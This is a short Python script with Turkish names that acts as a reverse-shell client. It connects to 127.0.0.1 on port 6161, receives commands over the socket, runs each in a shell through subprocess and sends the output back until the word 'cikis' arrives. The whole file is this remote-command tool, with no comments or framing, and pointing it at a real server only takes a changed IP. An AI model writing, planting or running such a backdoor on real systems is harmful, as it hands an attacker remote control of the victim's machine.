import socket
import subprocess
port=6161
ip="127.0.0.1"
def baglanti():
   Socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   Socket.connect((ip,port))
   while True:
       komut = Socket.recv(1024)

       if 'cikis' in komut:
           Socket.close()
           break
       else:
           CMD=subprocess.Popen(komut, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
           Socket.send(CMD.stdout.read().encode())
           Socket.send(CMD.stderr.read().encode())
baglanti()